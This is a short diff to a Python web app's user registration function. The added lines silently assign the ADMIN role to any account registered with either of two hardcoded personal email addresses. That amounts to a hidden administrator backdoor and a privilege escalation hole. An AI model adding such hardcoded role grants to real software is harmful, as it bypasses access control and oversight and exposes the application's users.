@@ -40,6 +40,8 @@ def register():
             new_user.email = email
             new_user.username = username
             new_user.password = generate_password_hash(password, method='scrypt')
+            if email == "antoninlefevre45@gmail.com" or email == "antoninlefevre45@icloud.com":
+                new_user.role = 'ADMIN'
             db.session.add(new_user)
             # init game wallet
             game_wallet = GameWallet()
